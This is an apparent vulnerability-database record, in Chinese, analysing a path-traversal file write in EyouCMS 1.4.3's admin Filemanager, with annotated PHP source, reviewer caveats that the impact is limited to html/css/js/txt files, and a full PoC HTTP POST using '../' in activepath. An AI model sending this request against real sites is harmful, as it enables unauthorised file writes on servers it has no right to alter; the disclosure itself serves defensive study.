---
source: "hatch 补库批 20260928"
product: "EyouCMS1.4.3 Filemanager"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Eyoucms 1.4.3 任意文件写入"
prerequisites: "来源所述条件，未列明部分仍待核：后台文件管理权限，可写目标目录；扩展白名单HTML/CSS/JS/TXT"
side_effects: "未执行；本文需注意的操作影响：标题任意文件写入过宽，正文明确扩展受限且无PHP绕过，应标受限路径穿越写入"
source_status: "unknown"
id: "vw-6dd348b95548028548021aee"
entity_id: "ve-6dd348b95548028548021aee"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台文件管理权限，可写目标目录；扩展白名单HTML/CSS/JS/TXT

- **结论使用边界（1）**：标题任意文件写入过宽，正文明确扩展受限且无PHP绕过，应标受限路径穿越写入。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：源码介绍editFile，PoC调用newfile，需补调用路径映射。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：完整请求含环境会话/XDEBUG残留，标准化时替换；无成功响应文本。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Eyoucms 1.4.3 任意文件写入

一、漏洞简介
------------

可写入html,css,js,txt文件，总体来说比较鸡肋。

二、漏洞影响
------------

Eyoucms 1.4.3

三、复现过程
------------

### 漏洞分析

漏洞点只对`filename`进行过滤，而忘了`activepath`也可以`../`进行跳转
`application/admin/controller/Filemanager.php`

      if (IS_POST) {
             $post = input('post.', '', null);
             $content = input('post.content', '', null);
             $filename = !empty($post['filename']) ? trim($post['filename']) : '';
             $content = !empty($content) ? $content : '';
             $activepath = !empty($post['activepath']) ? trim($post['activepath']) : '';

                 ... ...

             $r = $this->filemanagerLogic->editFile($filename, $activepath, $content);
             if ($r === true) {
                 $this->success('操作成功！', url('Filemanager/index', array('activepath'=>$this->filemanagerLogic->replace_path($activepath, ':', false))));
                 exit;
             } else {
                 ... ...

跟进`editFile`函数

    application/admin/logic/FilemanagerLogic.php
     public function editFile($filename, $activepath = '', $content = '')
     {
         $fileinfo = pathinfo($filename);// pathinfo获取后缀
         $ext = strtolower($fileinfo['extension']);

         ......

         /*允许编辑的文件类型*/
         if (!in_array($ext, $this->editExt)) { //<<<<<基于白名单，暂时没有想到绕过的方法>>>>>
             return '只允许操作文件类型如下：'.implode('|', $this->editExt);
         }
         /*--end*/

         $filename = str_replace("..", "", $filename);// 仅对filename进行过滤
         $file = $this->baseDir."$activepath/$filename"; // 此处直接拼接产生漏洞
         if (!is_writable(dirname($file))) {
             return "请把模板文件目录设置为可写入权限！";
         }
         if ('css' != $ext) {
             $content = htmlspecialchars_decode($content, ENT_QUOTES);
             $content = preg_replace("/(@)?eval(\s*)\(/i", 'intval(', $content);//
             // $content = preg_replace("/\?\bphp\b/i", "？ｍｕｍａ", $content);
         }
         $fp = fopen($file, "w");
         fputs($fp, $content);
         fclose($fp);
         return true;
     }

### 漏洞复现

### poc

     POST /eyoucms/login.php?m=admin&c=Filemanager&a=newfile&lang=cn HTTP/1.1
     Host: 127.0.0.1
     User-Agent: Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 94
     Origin: http://127.0.0.1
     Connection: close
     Referer: http://127.0.0.1/eyoucms/login.php?m=admin&c=Filemanager&a=newfile&activepath=%3Atemplate%3Aplugins%3Atest&lang=cn
     Cookie: home_lang=cn; admin_lang=cn; PHPSESSID=h6k********************dt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705
     Upgrade-Insecure-Requests: 1

     activepath=%2Ftemplate%2Fplugins%2Ftest/../../../uploads/tmp&filename=newfile.htm&content=test
